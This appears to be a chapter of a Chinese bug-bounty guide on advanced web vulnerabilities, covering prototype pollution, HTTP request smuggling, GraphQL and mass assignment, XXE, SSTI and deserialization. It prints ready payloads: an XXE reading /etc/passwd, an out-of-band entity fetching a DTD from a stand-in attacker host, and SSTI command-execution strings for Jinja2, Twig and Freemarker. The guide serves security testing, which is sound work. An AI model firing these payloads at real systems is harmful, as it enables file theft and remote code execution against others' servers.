# 11 进阶漏洞

> 高难度高回报：竞争少、难自动化、一旦命中基本 Critical。本章覆盖原型污染、请求走私、API 安全（含 GraphQL/Mass Assignment）、XXE、SSTI。

## 原型污染（Prototype Pollution）

**原理**：修改 `Object.prototype` 属性，所有 JS 对象都继承它，污染级联全应用。Node.js 应用必测。

### 攻击向量

```json
{"__proto__": {"evilProperty": "evilPayload"}}
{"constructor": {"prototype": {"foo": "bar"}}}
```

URL 污染：`https://victim.com/#__proto__[admin]=1`

ExpressJS 特定测试：
```json
{"__proto__": {"parameterLimit": 1}}
{"__proto__": {"ignoreQueryPrefix": true}}
{"__proto__": {"allowDots": true}}
{"__proto__": {"status": 510}}
```

### 影响

- 服务端（SSPP）：RCE（Kibana CVE-2019-7609）
- 客户端（CSPP）：XSS、绕过 HTML 消毒器、DoS

**找 gadget 比找污染点更难**；污染 + gadget = RCE = Critical。工具：pp-finder、PPScan、silent-spring。

## HTTP 请求走私

**原理**：前端和后端代理对 HTTP 请求边界的理解不一致。

| 类型 | 前端 | 后端 | 关键 |
|------|------|------|------|
| CL.TE | Content-Length | Transfer-Encoding | 常见 |
| TE.CL | Transfer-Encoding | Content-Length | — |
| TE.TE | 双方都支持 TE | 混淆绕过 | `Transfer-Encoding: xchunked`、`Transfer-Encoding : chunked`（带空格）、`Transfer-Encoding:[tab]chunked` |
| HTTP/2 降级 | h2 → h1.1 | 注入无效头或 CRLF | 新战线 |

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

影响：绕过安全控制、凭证劫持、缓存投毒、**把反射型 XSS 变存储型**（走私进别人请求）。工具：HTTP Request Smuggler（Burp）、Smuggler（defparam）。

## API 安全

### Mass Assignment

攻击者修改不应访问的对象属性（如 body 里加 `"is_admin": true`）。**测试：每个 JSON body 都试加额外字段**（role/isAdmin/price/status/vip）。预防：白名单允许字段。

### GraphQL

- **内省暴露**：生产环境应禁用——没关 = 低垂果实，直接枚举全 schema
- 嵌套查询攻击 / 资源耗尽：需查询深度限制与成本分析
- 未授权查询执行：生产环境应白名单允许的查询
- GraphQL endpoint 变体路径：`/graphql`、`/graphiql`、`/api/graphql`、`/v1/graphql`

### 速率限制与信息泄露

- 按 API key + IP 限流，滑动窗口优于固定窗口
- 移除 `X-Powered-By`、`Server`、`X-AspNet-Version` 响应头；生产关闭 DEBUG
- **API 是 SRC 新战场，大厂 API 防护常弱于主站**
- 前后端分离 restful API 的旧版本接口（`/api/v1/` vs `/api/v2/`）——快速迭代遗留，v1 常还活着且没鉴权

### WebService/SOAP

SOAP UI Pro 自动化测 + XXE/SQL 注入/SSRF 组合。

## XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

- 参数实体外带（OOB）：`<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">`
- 攻击点：SOAP、RSS、office 文档（docx/xlsx 上传解析）、SVG
- PHP 期望：`expect://id`；内网探测同 SSRF

## SSTI（模板注入）

判定：`{{7*7}}` 回显 49。分引擎：
- Jinja2（Python）：`{{config}}`、`{{ ''.__class__.__mro__[1].__subclasses__() }}`
- Twig（PHP）：`{{_self.env.registerUndefinedFilterCallback("exec")}}`
- Java（Freemarker/Velocity）：`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`

模板注入 → RCE 直通车；高发位置：邮件模板、CMS 主题编辑、低代码平台自定义渲染。

## 反序列化

- Java：Commons Collections、fastjson（`{"@type":"com.sun.rowset.JdbcRowSetImpl",...}` 打 JNDI）、Shiro rememberMe（AES key 硬编码）、Weblogic T3
- PHP：`unserialize` magic method 链（phar 反序列化）
- Python：pickle、yaml.load
